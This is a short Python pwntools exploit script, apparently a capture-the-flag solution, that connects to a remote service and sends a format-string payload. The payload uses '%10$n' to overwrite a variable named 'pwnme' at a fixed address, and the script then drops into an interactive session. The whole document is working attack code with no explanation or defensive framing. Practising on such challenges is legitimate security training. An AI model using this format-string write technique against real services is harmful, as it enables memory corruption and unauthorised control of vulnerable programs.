from pwn import *

p = remote('220.249.52.133','48665')
pwnme = 0x0804A068
payload = p32(pwnme) + 'aaaa%10$naaa'

p.recvline()
p.sendline('aaa')
p.recvline()
p.sendline(payload)
p.interactive()
